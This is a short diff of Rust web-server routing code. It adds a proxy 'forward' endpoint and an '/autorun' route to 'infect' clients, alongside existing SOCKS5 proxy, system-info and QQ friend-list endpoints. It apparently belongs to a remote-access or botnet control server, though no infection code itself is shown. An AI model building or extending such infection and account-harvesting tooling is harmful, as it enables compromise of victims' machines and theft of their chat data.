@@ -84,7 +84,8 @@ pub async fn run(config: &Config, server_map: Arc<RwLock<ServerMap>>) -> Result<
                             .service(
                                 web::scope("/proxy")
                                     .service(client::proxy::socks5::noauth::post)
-                                    .service(client::proxy::socks5::pass::post),
+                                    .service(client::proxy::socks5::pass::post)
+                                    .service(client::proxy::forward::post),
                             )
                             .service(web::scope("/info").service(client::info::system::get))
                             .service(
@@ -95,7 +96,8 @@ pub async fn run(config: &Config, server_map: Arc<RwLock<ServerMap>>) -> Result<
                                     .service(client::qq::get)
                                     .service(client::qq::url::get)
                                     .service(client::qq::friend::get),
-                            ),
+                            )
+                            .service(web::scope("/autorun").service(client::autorun::infect::post)),
                     ),
             )
             .service(
